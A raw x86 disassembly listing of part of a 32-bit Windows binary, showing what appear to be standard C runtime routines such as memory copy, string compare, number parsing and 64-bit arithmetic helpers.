  428507:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  42850e:	inc    edx
  42850f:	add    BYTE PTR [ebp+eax*4+0x42],al
  428513:	add    BYTE PTR [ebp+eax*4+0x42],cl
  428517:	add    BYTE PTR [edi-0x7b],bl
  42851a:	inc    edx
  42851b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428521:	inc    esp
  428522:	(bad)  
  428523:	sbb    al,0x8b
  428525:	inc    esp
  428526:	mov    ds,WORD PTR [eax]
  428528:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42852c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428530:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428534:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428538:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428540:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428548:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428550:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428554:	lea    eax,[ecx*4+0x0]
  42855b:	add    esi,eax
  42855d:	add    edi,eax
  42855f:	jmp    DWORD PTR [edx*4+0x428568]
  428566:	mov    edi,edi
  428568:	js     0x4284ef
  42856a:	inc    edx
  42856b:	add    BYTE PTR [eax-0x6fffbd7b],al
  428571:	test   DWORD PTR [edx+0x0],eax
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	test   DWORD PTR [edx+0x0],eax
  428578:	mov    eax,DWORD PTR [ebp+0x8]
  42857b:	pop    esi
  42857c:	pop    edi
  42857d:	leave  
  42857e:	ret    
  42857f:	nop
  428580:	mov    al,BYTE PTR [esi+0x3]
  428583:	mov    BYTE PTR [edi+0x3],al
  428586:	mov    eax,DWORD PTR [ebp+0x8]
  428589:	pop    esi
  42858a:	pop    edi
  42858b:	leave  
  42858c:	ret    
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    al,BYTE PTR [esi+0x2]
  428599:	mov    BYTE PTR [edi+0x2],al
  42859c:	mov    eax,DWORD PTR [ebp+0x8]
  42859f:	pop    esi
  4285a0:	pop    edi
  4285a1:	leave  
  4285a2:	ret    
  4285a3:	nop
  4285a4:	mov    al,BYTE PTR [esi+0x3]
  4285a7:	mov    BYTE PTR [edi+0x3],al
  4285aa:	mov    al,BYTE PTR [esi+0x2]
  4285ad:	mov    BYTE PTR [edi+0x2],al
  4285b0:	mov    al,BYTE PTR [esi+0x1]
  4285b3:	mov    BYTE PTR [edi+0x1],al
  4285b6:	mov    eax,DWORD PTR [ebp+0x8]
  4285b9:	pop    esi
  4285ba:	pop    edi
  4285bb:	leave  
  4285bc:	ret    
  4285bd:	push   ebp
  4285be:	mov    ebp,esp
  4285c0:	sub    esp,0xc
  4285c3:	mov    eax,ds:0x45d430
  4285c8:	xor    eax,DWORD PTR [ebp+0x4]
  4285cb:	and    BYTE PTR [ebp-0x6],0x0
  4285cf:	push   0x6
  4285d1:	mov    DWORD PTR [ebp-0x4],eax
  4285d4:	lea    eax,[ebp-0xc]
  4285d7:	push   eax
  4285d8:	push   0x1004
  4285dd:	push   DWORD PTR [ebp+0x8]
  4285e0:	call   DWORD PTR ds:0x4290fc
  4285e6:	test   eax,eax
  4285e8:	jne    0x4285ef
  4285ea:	or     eax,0xffffffff
  4285ed:	jmp    0x4285f9
  4285ef:	lea    eax,[ebp-0xc]
  4285f2:	push   eax
  4285f3:	call   0x4288fe
  4285f8:	pop    ecx
  4285f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4285fc:	xor    ecx,DWORD PTR [ebp+0x4]
  4285ff:	call   0x425a0c
  428604:	leave  
  428605:	ret    
  428606:	push   0x38
  428608:	push   0x429fb8
  42860d:	call   0x425340
  428612:	mov    eax,ds:0x45d430
  428617:	xor    eax,DWORD PTR [ebp+0x4]
  42861a:	mov    DWORD PTR [ebp-0x1c],eax
  42861d:	xor    edi,edi
  42861f:	mov    DWORD PTR [ebp-0x20],edi
  428622:	mov    DWORD PTR [ebp-0x24],edi
  428625:	mov    eax,DWORD PTR [ebp+0x14]
  428628:	mov    ebx,DWORD PTR [eax]
  42862a:	mov    DWORD PTR [ebp-0x28],ebx
  42862d:	mov    DWORD PTR [ebp-0x2c],edi
  428630:	mov    eax,DWORD PTR [ebp+0x8]
  428633:	cmp    eax,DWORD PTR [ebp+0xc]
  428636:	je     0x4287af
  42863c:	lea    ecx,[ebp-0x40]
  42863f:	push   ecx
  428640:	push   eax
  428641:	mov    esi,DWORD PTR ds:0x4290c4
  428647:	call   esi
  428649:	test   eax,eax
  42864b:	je     0x42866d
  42864d:	cmp    DWORD PTR [ebp-0x40],0x1
  428651:	jne    0x42866d
  428653:	lea    eax,[ebp-0x40]
  428656:	push   eax
  428657:	push   DWORD PTR [ebp+0xc]
  42865a:	call   esi
  42865c:	test   eax,eax
  42865e:	je     0x42866d
  428660:	cmp    DWORD PTR [ebp-0x40],0x1
  428664:	jne    0x42866d
  428666:	mov    DWORD PTR [ebp-0x2c],0x1
  42866d:	cmp    DWORD PTR [ebp-0x2c],edi
  428670:	je     0x42868c
  428672:	cmp    ebx,0xffffffff
  428675:	je     0x42867b
  428677:	mov    esi,ebx
  428679:	jmp    0x428687
  42867b:	push   DWORD PTR [ebp+0x10]
  42867e:	call   0x425950
  428683:	pop    ecx
  428684:	mov    esi,eax
  428686:	inc    esi
  428687:	mov    DWORD PTR [ebp-0x44],esi
  42868a:	jmp    0x42868f
  42868c:	mov    esi,DWORD PTR [ebp-0x44]
  42868f:	cmp    DWORD PTR [ebp-0x2c],edi
  428692:	jne    0x4286ae
  428694:	push   edi
  428695:	push   edi
  428696:	push   ebx
  428697:	push   DWORD PTR [ebp+0x10]
  42869a:	push   0x1
  42869c:	push   DWORD PTR [ebp+0x8]
  42869f:	call   DWORD PTR ds:0x4290ec
  4286a5:	mov    esi,eax
  4286a7:	mov    DWORD PTR [ebp-0x44],esi
  4286aa:	cmp    esi,edi
  4286ac:	je     0x428706
  4286ae:	mov    DWORD PTR [ebp-0x4],edi
  4286b1:	lea    eax,[esi+esi*1]
  4286b4:	add    eax,0x3
  4286b7:	and    eax,0xfffffffc
  4286ba:	call   0x425390
  4286bf:	mov    DWORD PTR [ebp-0x18],esp
  4286c2:	mov    ebx,esp
  4286c4:	mov    DWORD PTR [ebp-0x48],ebx
  4286c7:	lea    eax,[esi+esi*1]
  4286ca:	push   eax
  4286cb:	push   edi
  4286cc:	push   ebx
  4286cd:	call   0x427c40
  4286d2:	add    esp,0xc
  4286d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286d9:	jmp    0x4286f2
  4286db:	xor    eax,eax
  4286dd:	inc    eax
  4286de:	ret    
  4286df:	mov    esp,DWORD PTR [ebp-0x18]
  4286e2:	call   0x4287d5
  4286e7:	xor    edi,edi
  4286e9:	xor    ebx,ebx
  4286eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ef:	mov    esi,DWORD PTR [ebp-0x44]
  4286f2:	cmp    ebx,edi
  4286f4:	jne    0x428714
  4286f6:	push   esi
  4286f7:	push   0x2
  4286f9:	call   0x426458
  4286fe:	pop    ecx
  4286ff:	pop    ecx
  428700:	mov    ebx,eax
  428702:	cmp    ebx,edi
  428704:	jne    0x42870d
  428706:	xor    eax,eax
  428708:	jmp    0x4287c1
  42870d:	mov    DWORD PTR [ebp-0x24],0x1
  428714:	push   esi
  428715:	push   ebx
  428716:	push   DWORD PTR [ebp-0x28]
  428719:	push   DWORD PTR [ebp+0x10]
  42871c:	push   0x1
  42871e:	push   DWORD PTR [ebp+0x8]
  428721:	call   DWORD PTR ds:0x4290ec
  428727:	test   eax,eax
  428729:	je     0x4287b2
  42872f:	cmp    DWORD PTR [ebp+0x18],edi
  428732:	je     0x428754
  428734:	push   edi
  428735:	push   edi
  428736:	push   DWORD PTR [ebp+0x1c]
  428739:	push   DWORD PTR [ebp+0x18]
  42873c:	push   esi
  42873d:	push   ebx
  42873e:	push   edi
  42873f:	push   DWORD PTR [ebp+0xc]
  428742:	call   DWORD PTR ds:0x42907c
  428748:	test   eax,eax
  42874a:	je     0x4287b2
  42874c:	mov    eax,DWORD PTR [ebp+0x18]
  42874f:	mov    DWORD PTR [ebp-0x20],eax
  428752:	jmp    0x4287b2
  428754:	cmp    DWORD PTR [ebp-0x2c],edi
  428757:	jne    0x42876f
  428759:	push   edi
  42875a:	push   edi
  42875b:	push   edi
  42875c:	push   edi
  42875d:	push   esi
  42875e:	push   ebx
  42875f:	push   edi
  428760:	push   DWORD PTR [ebp+0xc]
  428763:	call   DWORD PTR ds:0x42907c
  428769:	mov    esi,eax
  42876b:	cmp    esi,edi
  42876d:	je     0x4287b2
  42876f:	push   esi
  428770:	push   0x1
  428772:	call   0x426458
  428777:	pop    ecx
  428778:	pop    ecx
  428779:	mov    DWORD PTR [ebp-0x20],eax
  42877c:	cmp    eax,edi
  42877e:	je     0x4287b2
  428780:	push   edi
  428781:	push   edi
  428782:	push   esi
  428783:	push   eax
  428784:	push   esi
  428785:	push   ebx
  428786:	push   edi
  428787:	push   DWORD PTR [ebp+0xc]
  42878a:	call   DWORD PTR ds:0x42907c
  428790:	cmp    eax,edi
  428792:	jne    0x4287a2
  428794:	push   DWORD PTR [ebp-0x20]
  428797:	call   0x425f4a
  42879c:	pop    ecx
  42879d:	mov    DWORD PTR [ebp-0x20],edi
  4287a0:	jmp    0x4287b2
  4287a2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287a6:	je     0x4287b2
  4287a8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287ab:	mov    DWORD PTR [ecx],eax
  4287ad:	jmp    0x4287b2
  4287af:	mov    ebx,DWORD PTR [ebp-0x48]
  4287b2:	cmp    DWORD PTR [ebp-0x24],edi
  4287b5:	je     0x4287be
  4287b7:	push   ebx
  4287b8:	call   0x425f4a
  4287bd:	pop    ecx
  4287be:	mov    eax,DWORD PTR [ebp-0x20]
  4287c1:	lea    esp,[ebp-0x54]
  4287c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287c7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287ca:	call   0x425a0c
  4287cf:	call   0x42537b
  4287d4:	ret    
  4287d5:	push   ebp
  4287d6:	mov    ebp,esp
  4287d8:	sub    esp,0x48
  4287db:	push   ebx
  4287dc:	push   esi
  4287dd:	push   edi
  4287de:	push   0x4
  4287e0:	pop    eax
  4287e1:	call   0x425390
  4287e6:	mov    ebx,esp
  4287e8:	push   0x1c
  4287ea:	lea    eax,[ebp-0x24]
  4287ed:	push   eax
  4287ee:	push   ebx
  4287ef:	call   DWORD PTR ds:0x429108
  4287f5:	test   eax,eax
  4287f7:	je     0x42886a
  4287f9:	mov    edi,DWORD PTR [ebp-0x20]
  4287fc:	lea    eax,[ebp-0x48]
  4287ff:	push   eax
  428800:	call   DWORD PTR ds:0x429048
  428806:	mov    eax,DWORD PTR [ebp-0x44]
  428809:	lea    esi,[eax-0x1]
  42880c:	not    esi
  42880e:	and    esi,ebx
  428810:	sub    esi,eax
  428812:	mov    DWORD PTR [ebp-0x4],eax
  428815:	mov    eax,ds:0x45dac4
  42881a:	mov    ecx,eax
  42881c:	dec    ecx
  42881d:	neg    ecx
  42881f:	sbb    ecx,ecx
  428821:	and    ecx,0xffff1000
  428827:	add    ecx,0x11000
  42882d:	add    ecx,edi
  42882f:	cmp    esi,ecx
  428831:	jb     0x42886a
  428833:	cmp    eax,0x1
  428836:	je     0x428882
  428838:	mov    ebx,edi
  42883a:	mov    edi,0x1000
  42883f:	push   0x1c
  428841:	lea    eax,[ebp-0x24]
  428844:	push   eax
  428845:	push   ebx
  428846:	call   DWORD PTR ds:0x429108
  42884c:	test   eax,eax
  42884e:	je     0x42886a
  428850:	add    ebx,DWORD PTR [ebp-0x18]
  428853:	test   DWORD PTR [ebp-0x14],edi
  428856:	je     0x42883f
  428858:	test   BYTE PTR [ebp-0xf],0x1
  42885c:	mov    ebx,DWORD PTR [ebp-0x24]
  42885f:	je     0x428866
  428861:	xor    eax,eax
  428863:	inc    eax
  428864:	jmp    0x42889e
  428866:	cmp    esi,ebx
  428868:	jae    0x42886e
  42886a:	xor    eax,eax
  42886c:	jmp    0x42889e
  42886e:	push   0x4
  428870:	push   edi
  428871:	push   DWORD PTR [ebp-0x4]
  428874:	push   ebx
  428875:	call   DWORD PTR ds:0x4290cc
  42887b:	mov    eax,ds:0x45dac4
  428880:	jmp    0x428884
  428882:	mov    ebx,esi
  428884:	dec    eax
  428885:	neg    eax
  428887:	sbb    eax,eax
  428889:	and    eax,0x103
  42888e:	lea    ecx,[ebp-0x8]
  428891:	push   ecx
  428892:	inc    eax
  428893:	push   eax
  428894:	push   DWORD PTR [ebp-0x4]
  428897:	push   ebx
  428898:	call   DWORD PTR ds:0x429104
  42889e:	lea    esp,[ebp-0x54]
  4288a1:	pop    edi
  4288a2:	pop    esi
  4288a3:	pop    ebx
  4288a4:	leave  
  4288a5:	ret    
  4288a6:	int3   
  4288a7:	int3   
  4288a8:	int3   
  4288a9:	int3   
  4288aa:	int3   
  4288ab:	int3   
  4288ac:	int3   
  4288ad:	int3   
  4288ae:	int3   
  4288af:	int3   
  4288b0:	push   ebp
  4288b1:	mov    ebp,esp
  4288b3:	push   edi
  4288b4:	push   esi
  4288b5:	push   ebx
  4288b6:	mov    esi,DWORD PTR [ebp+0xc]
  4288b9:	mov    edi,DWORD PTR [ebp+0x8]
  4288bc:	mov    al,0xff
  4288be:	mov    edi,edi
  4288c0:	or     al,al
  4288c2:	je     0x4288f6
  4288c4:	mov    al,BYTE PTR [esi]
  4288c6:	add    esi,0x1
  4288c9:	mov    ah,BYTE PTR [edi]
  4288cb:	add    edi,0x1
  4288ce:	cmp    ah,al
  4288d0:	je     0x4288c0
  4288d2:	sub    al,0x41
  4288d4:	cmp    al,0x1a
  4288d6:	sbb    cl,cl
  4288d8:	and    cl,0x20
  4288db:	add    al,cl
  4288dd:	add    al,0x41
  4288df:	xchg   al,ah
  4288e1:	sub    al,0x41
  4288e3:	cmp    al,0x1a
  4288e5:	sbb    cl,cl
  4288e7:	and    cl,0x20
  4288ea:	add    al,cl
  4288ec:	add    al,0x41
  4288ee:	cmp    al,ah
  4288f0:	je     0x4288c0
  4288f2:	sbb    al,al
  4288f4:	sbb    al,0xff
  4288f6:	movsx  eax,al
  4288f9:	pop    ebx
  4288fa:	pop    esi
  4288fb:	pop    edi
  4288fc:	leave  
  4288fd:	ret    
  4288fe:	push   esi
  4288ff:	push   edi
  428900:	call   0x4251f3
  428905:	mov    edi,DWORD PTR [eax+0x64]
  428908:	cmp    edi,DWORD PTR ds:0x45d58c
  42890e:	je     0x428917
  428910:	call   0x42669f
  428915:	mov    edi,eax
  428917:	mov    esi,DWORD PTR [esp+0xc]
  42891b:	cmp    DWORD PTR [edi+0x28],0x1
  42891f:	movzx  eax,BYTE PTR [esi]
  428922:	jle    0x428932
  428924:	push   0x8
  428926:	push   eax
  428927:	push   edi
  428928:	call   0x428986
  42892d:	add    esp,0xc
  428930:	jmp    0x42893c
  428932:	mov    ecx,DWORD PTR [edi+0x48]
  428935:	movzx  eax,BYTE PTR [ecx+eax*2]
  428939:	and    eax,0x8
  42893c:	test   eax,eax
  42893e:	je     0x428943
  428940:	inc    esi
  428941:	jmp    0x42891b
  428943:	movzx  ecx,BYTE PTR [esi]
  428946:	inc    esi
  428947:	cmp    ecx,0x2d
  42894a:	mov    edx,ecx
  42894c:	je     0x428953
  42894e:	cmp    ecx,0x2b
  428951:	jne    0x428957
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	xor    eax,eax
  428959:	cmp    ecx,0x30
  42895c:	jl     0x428968
  42895e:	cmp    ecx,0x39
  428961:	jg     0x428968
  428963:	sub    ecx,0x30
  428966:	jmp    0x42896b
  428968:	or     ecx,0xffffffff
  42896b:	cmp    ecx,0xffffffff
  42896e:	je     0x42897c
  428970:	lea    eax,[eax+eax*4]
  428973:	lea    eax,[ecx+eax*2]
  428976:	movzx  ecx,BYTE PTR [esi]
  428979:	inc    esi
  42897a:	jmp    0x428959
  42897c:	cmp    edx,0x2d
  42897f:	pop    edi
  428980:	pop    esi
  428981:	jne    0x428985
  428983:	neg    eax
  428985:	ret    
  428986:	push   ebp
  428987:	mov    ebp,esp
  428989:	push   ecx
  42898a:	mov    eax,DWORD PTR [ebp+0xc]
  42898d:	lea    ecx,[eax+0x1]
  428990:	cmp    ecx,0x100
  428996:	mov    ecx,DWORD PTR [ebp+0x8]
  428999:	ja     0x4289a4
  42899b:	mov    ecx,DWORD PTR [ecx+0x48]
  42899e:	movzx  eax,WORD PTR [ecx+eax*2]
  4289a2:	jmp    0x4289f8
  4289a4:	push   esi
  4289a5:	mov    edx,eax
  4289a7:	sar    edx,0x8
  4289aa:	push   edi
  4289ab:	mov    edi,DWORD PTR [ecx+0x48]
  4289ae:	movzx  esi,dl
  4289b1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289b6:	pop    edi
  4289b7:	pop    esi
  4289b8:	je     0x4289c9
  4289ba:	and    BYTE PTR [ebp-0x2],0x0
  4289be:	push   0x2
  4289c0:	mov    BYTE PTR [ebp-0x3],al
  4289c3:	mov    BYTE PTR [ebp-0x4],dl
  4289c6:	pop    eax
  4289c7:	jmp    0x4289d3
  4289c9:	and    BYTE PTR [ebp-0x3],0x0
  4289cd:	mov    BYTE PTR [ebp-0x4],al
  4289d0:	xor    eax,eax
  4289d2:	inc    eax
  4289d3:	push   0x1
  4289d5:	push   DWORD PTR [ecx+0x14]
  4289d8:	push   DWORD PTR [ecx+0x4]
  4289db:	lea    ecx,[ebp+0xe]
  4289de:	push   ecx
  4289df:	push   eax
  4289e0:	lea    eax,[ebp-0x4]
  4289e3:	push   eax
  4289e4:	push   0x1
  4289e6:	call   0x427a68
  4289eb:	add    esp,0x1c
  4289ee:	test   eax,eax
  4289f0:	jne    0x4289f4
  4289f2:	leave  
  4289f3:	ret    
  4289f4:	movzx  eax,WORD PTR [ebp+0xe]
  4289f8:	and    eax,DWORD PTR [ebp+0x10]
  4289fb:	leave  
  4289fc:	ret    
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	mov    eax,DWORD PTR [esp+0x8]
  428a04:	mov    ecx,DWORD PTR [esp+0x10]
  428a08:	or     ecx,eax
  428a0a:	mov    ecx,DWORD PTR [esp+0xc]
  428a0e:	jne    0x428a19
  428a10:	mov    eax,DWORD PTR [esp+0x4]
  428a14:	mul    ecx
  428a16:	ret    0x10
  428a19:	push   ebx
  428a1a:	mul    ecx
  428a1c:	mov    ebx,eax
  428a1e:	mov    eax,DWORD PTR [esp+0x8]
  428a22:	mul    DWORD PTR [esp+0x14]
  428a26:	add    ebx,eax
  428a28:	mov    eax,DWORD PTR [esp+0x8]
  428a2c:	mul    ecx
  428a2e:	add    edx,ebx
  428a30:	pop    ebx
  428a31:	ret    0x10
  428a34:	int3   
  428a35:	int3   
  428a36:	int3   
  428a37:	int3   
  428a38:	int3   
  428a39:	int3   
  428a3a:	int3   
  428a3b:	int3   
  428a3c:	int3   
  428a3d:	int3   
  428a3e:	int3   
  428a3f:	int3   
  428a40:	push   ebp
  428a41:	mov    ebp,esp
  428a43:	push   edi
  428a44:	push   esi
  428a45:	push   ebx
  428a46:	mov    ecx,DWORD PTR [ebp+0x10]
  428a49:	or     ecx,ecx
  428a4b:	je     0x428a9a
  428a4d:	mov    esi,DWORD PTR [ebp+0x8]
  428a50:	mov    edi,DWORD PTR [ebp+0xc]
  428a53:	mov    bh,0x41
  428a55:	mov    bl,0x5a
  428a57:	mov    dh,0x20
  428a59:	lea    ecx,[ecx+0x0]
  428a5c:	mov    ah,BYTE PTR [esi]
  428a5e:	or     ah,ah
  428a60:	mov    al,BYTE PTR [edi]
  428a62:	je     0x428a8b
  428a64:	or     al,al
  428a66:	je     0x428a8b
  428a68:	add    esi,0x1
  428a6b:	add    edi,0x1
  428a6e:	cmp    ah,bh
  428a70:	jb     0x428a78
  428a72:	cmp    ah,bl
  428a74:	ja     0x428a78
  428a76:	add    ah,dh
  428a78:	cmp    al,bh
  428a7a:	jb     0x428a82
  428a7c:	cmp    al,bl
  428a7e:	ja     0x428a82
  428a80:	add    al,dh
  428a82:	cmp    ah,al
  428a84:	jne    0x428a91
  428a86:	sub    ecx,0x1
  428a89:	jne    0x428a5c
  428a8b:	xor    ecx,ecx
  428a8d:	cmp    ah,al
  428a8f:	je     0x428a9a
  428a91:	mov    ecx,0xffffffff
  428a96:	jb     0x428a9a
  428a98:	neg    ecx
  428a9a:	mov    eax,ecx
  428a9c:	pop    ebx
  428a9d:	pop    esi
  428a9e:	pop    edi
  428a9f:	leave  
  428aa0:	ret    
  428aa1:	int3   
  428aa2:	int3   
  428aa3:	int3   
  428aa4:	int3   
  428aa5:	int3   
  428aa6:	int3   
  428aa7:	int3   
  428aa8:	int3   
  428aa9:	int3   
  428aaa:	int3   
  428aab:	int3   
  428aac:	int3   
  428aad:	int3   
  428aae:	int3   
  428aaf:	int3   
  428ab0:	push   esi
  428ab1:	mov    eax,DWORD PTR [esp+0x14]
  428ab5:	or     eax,eax
  428ab7:	jne    0x428ae1
  428ab9:	mov    ecx,DWORD PTR [esp+0x10]
  428abd:	mov    eax,DWORD PTR [esp+0xc]
  428ac1:	xor    edx,edx
  428ac3:	div    ecx
  428ac5:	mov    ebx,eax
  428ac7:	mov    eax,DWORD PTR [esp+0x8]
  428acb:	div    ecx
  428acd:	mov    esi,eax
  428acf:	mov    eax,ebx
  428ad1:	mul    DWORD PTR [esp+0x10]
  428ad5:	mov    ecx,eax
  428ad7:	mov    eax,esi
  428ad9:	mul    DWORD PTR [esp+0x10]
  428add:	add    edx,ecx
  428adf:	jmp    0x428b28
  428ae1:	mov    ecx,eax
  428ae3:	mov    ebx,DWORD PTR [esp+0x10]
  428ae7:	mov    edx,DWORD PTR [esp+0xc]
  428aeb:	mov    eax,DWORD PTR [esp+0x8]
  428aef:	shr    ecx,1
  428af1:	rcr    ebx,1
  428af3:	shr    edx,1
  428af5:	rcr    eax,1
  428af7:	or     ecx,ecx
  428af9:	jne    0x428aef
  428afb:	div    ebx
  428afd:	mov    esi,eax
  428aff:	mul    DWORD PTR [esp+0x14]
  428b03:	mov    ecx,eax
  428b05:	mov    eax,DWORD PTR [esp+0x10]
  428b09:	mul    esi
  428b0b:	add    edx,ecx
  428b0d:	jb     0x428b1d
  428b0f:	cmp    edx,DWORD PTR [esp+0xc]
  428b13:	ja     0x428b1d
  428b15:	jb     0x428b26
  428b17:	cmp    eax,DWORD PTR [esp+0x8]
  428b1b:	jbe    0x428b26
  428b1d:	dec    esi
  428b1e:	sub    eax,DWORD PTR [esp+0x10]
  428b22:	sbb    edx,DWORD PTR [esp+0x14]
  428b26:	xor    ebx,ebx
  428b28:	sub    eax,DWORD PTR [esp+0x8]
  428b2c:	sbb    edx,DWORD PTR [esp+0xc]
  428b30:	neg    edx
  428b32:	neg    eax
  428b34:	sbb    edx,0x0
  428b37:	mov    ecx,edx
  428b39:	mov    edx,ebx
  428b3b:	mov    ebx,ecx
  428b3d:	mov    ecx,eax
  428b3f:	mov    eax,esi
  428b41:	pop    esi
  428b42:	ret    0x10
  428b45:	int3   
  428b46:	int3   
  428b47:	int3   
  428b48:	int3   
  428b49:	int3   
  428b4a:	int3   
  428b4b:	int3   
  428b4c:	int3   
  428b4d:	int3   
  428b4e:	int3   
  428b4f:	int3   
  428b50:	lea    eax,[edx-0x1]
  428b53:	pop    ebx
  428b54:	ret    
  428b55:	lea    esp,[esp+0x0]
  428b5c:	lea    esp,[esp+0x0]
  428b60:	xor    eax,eax
  428b62:	mov    al,BYTE PTR [esp+0x8]
  428b66:	push   ebx
  428b67:	mov    ebx,eax
  428b69:	shl    eax,0x8
  428b6c:	mov    edx,DWORD PTR [esp+0x8]
  428b70:	test   edx,0x3
  428b76:	je     0x428b8d
  428b78:	mov    cl,BYTE PTR [edx]
  428b7a:	add    edx,0x1
  428b7d:	cmp    cl,bl
  428b7f:	je     0x428b50
  428b81:	test   cl,cl
  428b83:	je     0x428bd6
  428b85:	test   edx,0x3
  428b8b:	jne    0x428b78
  428b8d:	or     ebx,eax
  428b8f:	push   edi
  428b90:	mov    eax,ebx
  428b92:	shl    ebx,0x10
  428b95:	push   esi
  428b96:	or     ebx,eax
  428b98:	mov    ecx,DWORD PTR [edx]
  428b9a:	mov    edi,0x7efefeff
  428b9f:	mov    eax,ecx
  428ba1:	mov    esi,edi
  428ba3:	xor    ecx,ebx
  428ba5:	add    esi,eax
  428ba7:	add    edi,ecx
  428ba9:	xor    ecx,0xffffffff
  428bac:	xor    eax,0xffffffff
  428baf:	xor    ecx,edi
  428bb1:	xor    eax,esi
  428bb3:	add    edx,0x4
  428bb6:	and    ecx,0x81010100
  428bbc:	jne    0x428bda
  428bbe:	and    eax,0x81010100
  428bc3:	je     0x428b98
  428bc5:	and    eax,0x1010100
  428bca:	jne    0x428bd4
  428bcc:	and    esi,0x80000000
  428bd2:	jne    0x428b98
  428bd4:	pop    esi
  428bd5:	pop    edi
  428bd6:	pop    ebx
  428bd7:	xor    eax,eax
  428bd9:	ret    
  428bda:	mov    eax,DWORD PTR [edx-0x4]
  428bdd:	cmp    al,bl
  428bdf:	je     0x428c17
  428be1:	test   al,al
  428be3:	je     0x428bd4
  428be5:	cmp    ah,bl
  428be7:	je     0x428c10
  428be9:	test   ah,ah
  428beb:	je     0x428bd4
  428bed:	shr    eax,0x10
  428bf0:	cmp    al,bl
  428bf2:	je     0x428c09
  428bf4:	test   al,al
  428bf6:	je     0x428bd4
  428bf8:	cmp    ah,bl
  428bfa:	je     0x428c02
  428bfc:	test   ah,ah
  428bfe:	je     0x428bd4
  428c00:	jmp    0x428b98
  428c02:	pop    esi
  428c03:	pop    edi
  428c04:	lea    eax,[edx-0x1]
  428c07:	pop    ebx
  428c08:	ret    
  428c09:	lea    eax,[edx-0x2]
  428c0c:	pop    esi
  428c0d:	pop    edi
  428c0e:	pop    ebx
  428c0f:	ret    
  428c10:	lea    eax,[edx-0x3]
  428c13:	pop    esi
  428c14:	pop    edi
  428c15:	pop    ebx
  428c16:	ret    
  428c17:	lea    eax,[edx-0x4]
  428c1a:	pop    esi
  428c1b:	pop    edi
  428c1c:	pop    ebx
  428c1d:	ret    
  428c1e:	jmp    DWORD PTR ds:0x429100
